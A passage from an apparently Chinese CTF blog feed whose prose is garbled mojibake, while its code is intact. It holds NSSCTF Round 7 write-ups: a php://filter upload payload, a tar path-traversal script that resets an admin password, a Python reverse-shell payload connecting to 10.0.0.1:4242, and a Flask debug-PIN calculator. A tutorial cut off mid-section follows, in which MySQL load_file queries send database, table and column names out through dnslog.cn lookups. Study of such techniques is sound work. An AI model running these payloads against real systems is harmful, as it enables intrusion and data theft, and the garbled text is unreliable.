&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%64%65%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%31%31%31%2e%70%6e%67%2e%70%68%70&#x27;</span>, content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">resp = requests.post(url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><p>èšå‰‘è¿æ¥åœ¨homeä¸‹æ‰¾åˆ°flag</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262157724.png" alt="image-20230226215742674"></p><p>å‚è€ƒï¼š<br><a href="https://blog.csdn.net/weixin_53090346/article/details/128815454">NSSRound#7 TeamWebå­¦ä¹ _Aiwin-Hackerçš„åšå®¢-CSDNåšå®¢</a><br><a href="https://blog.csdn.net/qq_64201116/article/details/128922324">NSSRound#7_æ¸…é£â€“çš„åšå®¢-CSDNåšå®¢</a><br><a href="https://www.ctfer.vip/note/set/923">NSSCTF - æ–‡ç«  - NSSRound#7 Team å®˜æ–¹Write Up (ctfer.vip)</a></p><h1 id="æ–°çš„åšå®¢"><a href="#æ–°çš„åšå®¢" class="headerlink" title="æ–°çš„åšå®¢"></a>æ–°çš„åšå®¢</h1><p>ç¬¬ä¸€ä¸ªè·¯ç”±ä¸‹å¯ä»¥å¾—åˆ°ä¸€äº›ä¿¡æ¯</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262200347.png" alt="image-20230226220057048"></p><p>è§£å¯†ä¸­é—´çš„å­—ç¬¦å¾—åˆ°æºç </p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262158964.png" alt="image-20230226215824314"></p><p>æ‰“å¼€å¯ä»¥çœ‹åˆ°åªè¦adminå¯ä»¥çœ‹åˆ°flagï¼Œè¿™é‡Œå…¶å®å°±æ˜¯åˆ©ç”¨ç›®å½•ç©¿è¶Šè¦†ç›–æ‰åŸæ¥çš„userinfo.jsonï¼Œé‡ç½®adminå¯†ç ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹CVE-2007-4559ï¼Œå¯æ€œæˆ‘å½“æ—¶è¿˜ä¸€ç›´æƒ³ç€ä¼ªé€ session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, hashlib, json</span><br><span class="line"> </span><br><span class="line">username = <span class="string">&#x27;Joker&#x27;</span> <span class="comment"># ä½ æ³¨å†Œæ—¶ç”¨çš„ç”¨æˆ·åï¼Œå°½é‡åˆ«æœ‰å¥‡æ€ªçš„ç¬¦å·</span></span><br><span class="line">admin_passwd = <span class="string">&#x27;123456&#x27;</span> <span class="comment"># ä¹‹åè¦ä½¿ç”¨adminè´¦æˆ·ç™»é™†æ—¶çš„å¯†ç </span></span><br><span class="line"> </span><br><span class="line">os.makedirs(<span class="string">&#x27;conf&#x27;</span>)</span><br><span class="line">os.makedirs(os.sep.join([os.getcwd(), <span class="string">&#x27;userData&#x27;</span>, username]))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(os.sep.join([os.getcwd(), <span class="string">&#x27;conf&#x27;</span>, <span class="string">&#x27;userinfo.json&#x27;</span>]), <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> tFile:</span><br><span class="line">    tFile.write(json.dumps(&#123;<span class="string">&#x27;admin&#x27;</span>: hashlib.sha512(admin_passwd.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">userDataDir = os.sep.join([os.getcwd(), <span class="string">&#x27;userData&#x27;</span>])</span><br><span class="line">os.system(<span class="string">f&#x27;cd &quot;<span class="subst">&#123;userDataDir&#125;</span>&quot; &amp;&amp; tar cPzvf upload.tar.gz <span class="subst">&#123;username&#125;</span>/../../conf/userinfo.json&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¹‹åä¼šäº§ç”Ÿä¸€ä¸ªupload.tar.gzæ–‡ä»¶ï¼Œç„¶åç”¨è„šæœ¬ä¸­çš„ç”¨æˆ·åå»æ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•åä¸Šä¼ ç”Ÿæˆçš„upload.tar.gzæ–‡ä»¶ï¼Œç„¶åæ³¨é”€ï¼Œç”¨adminç™»å½•å³å¯çœ‹åˆ°flag</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262201544.png" alt="image-20230226220113486"></p><h1 id="ShadowFlag"><a href="#ShadowFlag" class="headerlink" title="ShadowFlag"></a>ShadowFlag</h1><p>å…ˆæ”¾ä»£ç ï¼Œä¹‹å‰æ²¡æ¥è§¦è¿‡è¿™ç±»é¢˜ï¼Œè‡ªå·±å¯¹äºLinuxçš„å¾ˆå¤šä¸œè¥¿ä¹Ÿä¸æ‡‚ï¼Œè¶æ­¤å¯ä»¥å­¦å­¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep  </span><br><span class="line">  </span><br><span class="line">app = Flask(__name__)  </span><br><span class="line">  </span><br><span class="line">flag1 = <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    flag2 = f.read()  </span><br><span class="line">tag = <span class="literal">False</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        <span class="keyword">return</span> f.read()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/shell&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():  </span><br><span class="line">    <span class="keyword">global</span> tag  </span><br><span class="line">    <span class="keyword">if</span> tag != <span class="literal">True</span>:  </span><br><span class="line">        <span class="keyword">global</span> flag1  </span><br><span class="line">        <span class="keyword">del</span> flag1  </span><br><span class="line">        tag = <span class="literal">True</span>  </span><br><span class="line">    os.system(<span class="string">&quot;rm -f /tmp/flag1.txt /tmp/flag2.txt&quot;</span>)  </span><br><span class="line">    action = request.form[<span class="string">&quot;act&quot;</span>]  </span><br><span class="line">    <span class="keyword">if</span> action.find(<span class="string">&quot; &quot;</span>) != -<span class="number">1</span>:  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nonono&quot;</span>  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        os.system(action)  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Wow&quot;</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error_date</span>(<span class="params">error</span>):  </span><br><span class="line">    sleep(<span class="number">5</span>)  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;æ‰«æ‰«æ‰«ï¼Œæ‰«å•¥ä¸œæ–¹æ˜ç å‘¢[æ€’]&quot;</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>ç›´æ¥çœ‹shellè·¯ç”±ï¼Œå¯ä»¥å¼¹ä¸ªshellï¼Œè¿™é‡Œè¿‡æ»¤äº†ç©ºæ ¼ç”¨%09å¯ä»¥ç»•è¿‡ï¼Œç„¶åå»å¤§ä½¬æ¨èçš„å¼¹shellå¤§åˆé›†é‡Œé¢æ‰¾ä¸ªpythonæ— ç©ºæ ¼çš„å°±è¡Œ,[å¼¹shellå¤§åˆé›†](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">PayloadsAllTheThings&#x2F;Reverse Shell Cheatsheet.md at master Â· swisskyrepo&#x2F;PayloadsAllTheThings (github.com)</a>)<br><code>act=python%09-c%09&#39;socket=__import__(&quot;socket&quot;);os=__import__(&quot;os&quot;);pty=__import__(&quot;pty&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</code><br>hackbaræ‰§è¡Œæ‹¿åˆ°shellï¼Œç„¶åè¿™é‡Œæ¶‰åŠåˆ°æ‹¿flagçš„ç¬¬ä¸€ä¸ªçŸ¥è¯†ç‚¹</p><blockquote><p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªflagæ˜¯ä½¿ç”¨openæ‰“å¼€çš„<code>flag1 = open(&quot;/tmp/flag1.txt&quot;, &quot;r&quot;)</code>ï¼Œä½†æ˜¯rmåˆ é™¤äº†ï¼Œä½†æ˜¯æ²¡æœ‰ç”¨close()æ¥å…³é—­ï¼Œè¿™æ ·å°±ä¼šé€ æˆï¼Œæ–‡ä»¶è™½ç„¶å·²ç»åˆ é™¤ä½†æ˜¯è¿›ç¨‹ä»ç„¶å­˜åœ¨ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥åœ¨<code>/proc/[pid]/fd</code>ä¸‹æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶</p></blockquote><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262201726.png" alt="image-20230226220131766"></p><p>è¿™æ ·å°±æ‰¾åˆ°äº†ç¬¬ä¸€æ®µflagï¼Œç„¶åæ‰¾ç¬¬äºŒæ®µflagï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°é«˜ç‰ˆæœ¬çš„flask pinå€¼è®¡ç®—ï¼Œå› ä¸ºç¬¬äºŒä¸ªflagæ˜¯ç”¨withæ‰“å¼€<code>with open(&quot;/tmp/flag2.txt&quot;, &quot;r&quot;) as f:</code>ç”¨withæ‰“å¼€ç‰¹ç‚¹æ˜¯ä½¿ç”¨å®Œåé»˜è®¤å…³é—­ï¼Œæ‰€ä»¥å°±å¾—ä»flaskç¯å¢ƒä¸­å»æ‰¾ï¼Œå³ç®—å‡ºpinå€¼ï¼Œæ‰“å¼€consoleè°ƒè¯•å»æ‰¾<br>è®¡ç®—pinå€¼éœ€è¦å¾—åˆ°ä¸‹é¢è¿™å‡ ä¸ªæ•°å€¼</p><blockquote><p>1.flaskæ‰€ç™»å½•çš„ç”¨æˆ·å<br>2.flaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„<br>2.å½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°<br>2.docker_idå’Œæœºå™¨id</p></blockquote><p>æ€ä¹ˆæ‰¾ç›´æ¥å†™åœ¨è„šæœ¬é‡Œé¢äº†ï¼Œdockeré‚£é‡Œå–æœ€ä¸Šé¢çš„å€¼å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sha1ç®—æ³•ï¼Œé€‚ç”¨äºé«˜ç‰ˆæœ¬flask  </span></span><br><span class="line"><span class="keyword">import</span> hashlib  </span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain  </span><br><span class="line">probably_public_bits = [  </span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span><span class="comment"># /etc/passwd ç”¨æˆ·å whoami </span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># é»˜è®¤å€¼  </span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># é»˜è®¤å€¼  </span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span> <span class="comment"># æŠ¥é”™å¾—åˆ° app.pyçš„ç»å¯¹è·¯å¾„  </span></span><br><span class="line">]  </span><br><span class="line">  </span><br><span class="line">private_bits = [  </span><br><span class="line">    <span class="comment"># /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&quot;02:42:ac:02:00:f7&quot;</span>.replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>),<span class="number">16</span>)),  </span><br><span class="line"> <span class="comment">#/proc/sys/kernel/random/boot_id + docker_id è¯»å–ç”¨/proc/self/cgroupæˆ–è€…/proc/1/cpuset  </span></span><br><span class="line">    <span class="string">&quot;e0ad2d31-1d21-4f57-b1c5-4a9036fbf235&quot;</span>+<span class="string">&quot;0dcbb0f159a0a2183aa148b6259b663635ea0a7ec4822b7da342ed08761bf47c&quot;</span>  </span><br><span class="line">]  </span><br><span class="line">  </span><br><span class="line">h = hashlib.sha1()  </span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:  </span><br><span class="line">        <span class="keyword">continue</span>  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):  </span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line">    h.update(bit)  </span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]  </span><br><span class="line">  </span><br><span class="line">num = <span class="literal">None</span>  </span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:  </span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)  </span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]  </span><br><span class="line">  </span><br><span class="line">rv =<span class="literal">None</span>  </span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:  </span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:  </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:  </span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)  </span><br><span class="line">                        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        rv = num  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°pinï¼Œç„¶ååœ¨ä¸‹é¢è¿™é‡Œè¾“å…¥flag2å¾—åˆ°</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262201618.png" alt="image-20230226220150459"></p><p>å‚è€ƒï¼š<br><a href="https://blog.csdn.net/qq_64201116/article/details/128922324">NSSRound#7_æ¸…é£â€“çš„åšå®¢-CSDNåšå®¢</a><br><a href="https://github.com/Randark-JMT/NSSCTF-Round_v7-ShadowFlag#nssctf-round7-shadowflag">Randark-JMT&#x2F;NSSCTF-Round_v7-ShadowFlag: A reverse challenge in NSSCTF Round#7 (github.com)</a><br>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæ³•äºŒï¼Œæœ‰å…´è¶£å¯ä»¥çœ‹çœ‹<br><a href="https://www.cnblogs.com/nLesxw/p/web_shadowflag.html">NSS Round7_web - nLesxw - åšå®¢å›­ (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DnsLogå¤–å¸¦æ³¨å…¥å­¦ä¹ </title>
      <link href="/undefined/61825.html"/>
      <url>/undefined/61825.html</url>
      
        <content type="html"><![CDATA[<h2 id="åº”ç”¨åœºæ™¯"><a href="#åº”ç”¨åœºæ™¯" class="headerlink" title="åº”ç”¨åœºæ™¯"></a>åº”ç”¨åœºæ™¯</h2><p> å½“æˆ‘ä»¬å¯¹ä¸€ä¸ªæ•°æ®åº“è¿›è¡Œæ³¨å…¥æ—¶ï¼Œæ— å›æ˜¾ï¼Œä¸”æ— æ³•è¿›è¡Œæ—¶é—´æ³¨å…¥ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨ä¸€ä¸ªé€šé“ï¼ŒæŠŠæŸ¥è¯¢åˆ°æ•°æ®é€šè¿‡é€šé“å¸¦å‡ºå»ï¼Œè¿™é‡Œçš„é€šé“åŒ…æ‹¬ï¼šhttpè¯·æ±‚ã€DNSè§£æã€SMBæœåŠ¡ç­‰å°†æ•°æ®å¸¦å‡ºã€‚</p><h2 id="DNSæ˜¯ä»€ä¹ˆ"><a href="#DNSæ˜¯ä»€ä¹ˆ" class="headerlink" title="DNSæ˜¯ä»€ä¹ˆ"></a>DNSæ˜¯ä»€ä¹ˆ</h2><p><a href="https://blog.csdn.net/king9666/article/details/106022050">DNSåŸç†åŠå…¶è§£æè¿‡ç¨‹_king9666çš„åšå®¢-CSDNåšå®¢</a><br>DNS( Domain Name System)æ˜¯â€œåŸŸåç³»ç»Ÿâ€çš„è‹±æ–‡ç¼©å†™ï¼Œæ˜¯ä¸€ç§ç»„ç»‡æˆåŸŸå±‚æ¬¡ç»“æ„çš„è®¡ç®—æœºå’Œç½‘ç»œæœåŠ¡å‘½åç³»ç»Ÿï¼Œå®ƒç”¨äºTCP&#x2F;IPç½‘ç»œï¼Œå®ƒæ‰€æä¾›çš„æœåŠ¡æ˜¯ç”¨æ¥å°†ä¸»æœºåå’ŒåŸŸåè½¬æ¢ä¸ºIPåœ°å€çš„å·¥ä½œã€‚DNSå°±æ˜¯è¿™æ ·çš„ä¸€ä½â€œç¿»è¯‘è€…â€.<br>åŒæ—¶,DNSæ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼æ•°æ®åº“ç³»ç»Ÿï¼Œå®ƒæä¾›å°†åŸŸåè½¬æ¢æˆå¯¹åº”IPåœ°å€çš„ä¿¡æ¯ã€‚è¿™ç§å°†åç§°è½¬æ¢æˆIPåœ°å€çš„æ–¹æ³•ç§°ä¸ºåŸŸåè§£æã€‚æ‰€ä»¥åœ¨ç”³è¯·åŸŸåçš„æ—¶å€™éƒ½è¦å°†åŸŸåæ‰€æŒ‡å‘çš„IPåœ°å€æäº¤ç»™NICã€‚è¿™æ ·å°±è¦æ±‚ä½ çš„IPå¿…é¡»æ˜¯å›ºå®šçš„æ‰å¯ä»¥ç”³è¯·åŸŸåã€‚<br><strong>ç®€å•æ¥è¯´å°±æ˜¯å°†åŸŸåè§£æä¸ºip</strong></p><p>ç„¶åæˆ‘ä»¬æ‰¾ä¸€ä¸ªç‰¹å®šçš„å¯ä»¥è®°å½•DNSè§£æçš„ç½‘ç«™<a href="http://dnslog.cn/">DNSLog Platform</a><br>è¿™ä¸ªç½‘ç«™å°±å¯ä»¥çœ‹åˆ°DNSè§£æè®°å½•ï¼Œå°†å›æ˜¾æ‰“åˆ°è¿™ä¸ªç½‘ç«™ä»è€Œå®ç°æ³¨å…¥<br>å…ˆçœ‹çœ‹ç½‘ç«™çš„ä½¿ç”¨ï¼Œè¿›å…¥ç‚¹å‡»Get SubDomainå¯ä»¥è·å¾—ä¸€ä¸ªåŸŸå<br><img src="https://s1.ax1x.com/2022/12/28/pSSpmQS.png" alt="pSSpmQS.png"><br>ç„¶åpingä¸€ä¸‹è¿™ä¸ªåŸŸå<br><img src="https://s1.ax1x.com/2022/12/28/zzxNsH.png" alt="zzxNsH.png"><br>å¯ä»¥çœ‹åˆ°èƒ½å¤Ÿpingé€šï¼Œè¯´æ˜DNSè§£ææˆåŠŸï¼Œç„¶åå»ç½‘é¡µç‚¹å‡»Refresh Recordå¯ä»¥çœ‹åˆ°è§£æè®°å½•<br><img src="https://s1.ax1x.com/2022/12/28/zzxJzD.png" alt="zzxJzD.png"><br>ç„¶åå®ƒä¹Ÿå¯ä»¥è§£ægum6ss.dnslog.cnåŸŸåä¸‹çš„ä»»ä½•å­åŸŸå<br><img src="https://s1.ax1x.com/2022/12/28/zzx8JK.png" alt="zzx8JK.png"><br>åŒæ ·å¯ä»¥åœ¨ç½‘ç«™çœ‹åˆ°è§£æè®°å½•</p><h2 id="MySQLä¸­load-file"><a href="#MySQLä¸­load-file" class="headerlink" title="MySQLä¸­load_file()"></a>MySQLä¸­load_file()</h2><p>é¦–å…ˆåœ¨æˆ‘ç”µè„‘<code>D:\MySQL</code>è·¯å¾„ä¸‹å‡†å¤‡ä¸€ä¸ªa.txtæ–‡ä»¶ï¼Œå†…å®¹ä¸ºhello!ï¼Œç„¶ååˆ©ç”¨load_file()å‡½æ•°è¯»å–<br><img src="https://s1.ax1x.com/2022/12/28/zzxGRO.png" alt="zzxGRO.png"><br>è¯»å–æˆåŠŸï¼Œè¿™é‡Œè·¯å¾„å¿…é¡»ç”¨&#x2F;æ‰è¡Œï¼Œè€Œä¸”MySQLçš„é…ç½®æ–‡ä»¶secure_file_privå¿…é¡»ä¸ºç©ºï¼Œå³secure_file_priv&#x3D;â€ â€œ</p><h2 id="concat-å‡½æ•°"><a href="#concat-å‡½æ•°" class="headerlink" title="concat()å‡½æ•°"></a>concat()å‡½æ•°</h2><p>è¿™ä¸ªå‡½æ•°æŒºç®€å•ï¼Œå°±æ˜¯ç”¨äºå¤šä¸ªå­—ç¬¦ä¸²æ‹¼æ¥<br><img src="https://s1.ax1x.com/2022/12/28/zzx3i6.png" alt="zzx3i6.png"></p><h2 id="æœ¬åœ°æµ‹è¯•"><a href="#æœ¬åœ°æµ‹è¯•" class="headerlink" title="æœ¬åœ°æµ‹è¯•"></a>æœ¬åœ°æµ‹è¯•</h2><p><strong>æ ¹æ®load_fileå‡½æ•°çš„è¯­æ³•è§„åˆ™ï¼Œè®¿é—®äº’è”ç½‘ä¸­çš„æ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æœ€å‰é¢åŠ ä¸Šä¸¤ä¸ªæ–œæ   &#x2F;&#x2F;</strong><br>ç„¶åæˆ‘é‡æ–°è·å–ä¸€ä¸ªåŸŸåä¸ºd07ib5.dnslog.cnï¼Œç”¨load_file()å‡½æ•°è·å–è¿™ä¸ªåŸŸåä¸‹çš„æ–‡ä»¶ä»è€Œç•™ä¸‹è§£æè®°å½•ï¼Œè¿™é‡Œçš„æ–‡ä»¶éšæ„ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç›®çš„æ˜¯ç•™ä¸‹è®°å½•ï¼Œè€Œä¸æ˜¯æŸ¥çœ‹æ–‡ä»¶<br><img src="https://s1.ax1x.com/2022/12/28/zzxlIx.png" alt="zzxlIx.png"><br>å¯ä»¥çœ‹åˆ°æˆåŠŸç•™ä¸‹è®°å½•<br><img src="https://s1.ax1x.com/2022/12/28/zzxQd1.png" alt="zzxQd1.png"></p><h3 id="è·å–åº“å"><a href="#è·å–åº“å" class="headerlink" title="è·å–åº“å"></a>è·å–åº“å</h3><p>è¿™æ ·å°±å¯ä»¥é€šè¿‡æ­¤æ–¹æ³•å»æ³¨å‡ºåº“åç­‰ï¼Œç„¶åæˆ‘åˆ›å»ºä¸€ä¸ªteståº“ï¼Œä½¿ç”¨è¿™ç§æ–¹æ³•å»æ³¨å…¥<br><img src="https://s1.ax1x.com/2022/12/28/zzxMZR.png" alt="zzxMZR.png"><br>ç„¶åå¯ä»¥çœ‹åˆ°å¾—åˆ°äº†teståº“å<br><img src="https://s1.ax1x.com/2022/12/28/zzxZzF.png" alt="zzxZzF.png"></p><h3 id="è·å–è¡¨å"><a href="#è·å–è¡¨å" class="headerlink" title="è·å–è¡¨å"></a>è·å–è¡¨å</h3><p>æˆ‘ä»¬éœ€è¦æ›´æ”¹group_concatå‡½æ•°ä¸­çš„é»˜è®¤é€—å·åˆ†éš”ç¬¦ï¼Œåœ¨ä½¿ç”¨group_concatåˆå¹¶æŸ¥è¯¢æ—¶ï¼Œä¼šè‡ªåŠ¨ä½¿ç”¨ â€œ,â€ è¿æ¥æˆ‘ä»¬æŸ¥è¯¢åˆ°çš„æ¯å€¼ï¼Œä½†æ˜¯ç”±äº <code>, </code>åœ¨urlä¸­æ˜¯ä¸å…è®¸å‡ºç°çš„ï¼Œæ‰€ä»¥ä½¿ç”¨groupæŸ¥è¯¢åˆ°çš„å€¼å»è§£ææ—¶å€™ï¼Œmysqlå°±ä¼šè®¤ä¸ºè¿™ä¸æ˜¯ä¸€ä¸ªurlåœ°å€ï¼Œå°±ä¸ä¼šå‡ºç°è§£æçš„æ“ä½œï¼Œæ‰€ä»¥å°±æ²¡æ³•è·å–åˆ°å€¼ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨ . (ç‚¹å·) ä¹Ÿå¯ä»¥ç”¨ _ (ä¸‹åˆ’çº¿)ï¼Œå»ºè®®çš„è¯ç”¨ç‚¹å¥½æ¯”è¾ƒå¥½ï¼Œé˜²æ­¢æ•°æ®åº“åº“åä¸­æœ¬èº«å­˜åœ¨ä¸‹åˆ’çº¿<br>è¿™é‡Œæˆ‘ç›´æ¥æŠŠè¯­å¥æ”¾å‡ºæ¥äº†ï¼Œæ˜¯çœŸçš„å®¹æ˜“æ•²é”™<br><code>select load_file(concat(&#39;//&#39;,(select group_concat(table_name separator  &#39;.&#39;)from information_schema.tables where table_schema=database()),&#39;.d07ib5.dnslog.cn/11.txt&#39;));</code><br><img src="https://s1.ax1x.com/2022/12/28/zzxEGT.png" alt="zzxEGT.png"><br>æŸ¥è¯¢åˆ°è¡¨å<br><img src="https://s1.ax1x.com/2022/12/28/zzxVRU.png" alt="zzxVRU.png"></p><h3 id="æŸ¥çœ‹å­—æ®µ"><a href="#æŸ¥çœ‹å­—æ®µ" class="headerlink" title="æŸ¥çœ‹å­—æ®µ"></a>æŸ¥çœ‹å­—æ®µ</h3><p><code>select load_file(concat(&#39;//&#39;,(select group_concat(column_name separator  &#39;.&#39;)from information_schema.columns where table_schema=database() and table_name=&#39;table1&#39;),&#39;.aqw3sw.dnslog.cn/1.txt&#39;));</code><br><img src="https://s1.ax1x.com/2022/12/28/zzxmM4.png" alt="zzxmM4.png"><br>æŸ¥è¯¢æˆåŠŸï¼ˆä¸­é€”æ¢äº†ä¸ªåŸŸåï¼‰<br><img src="https://s1.ax1x.com/2022/12/28/zzxnsJ.png" alt="zzxnsJ.png"></p><h3 id="æŸ¥çœ‹æ•°æ®"><a 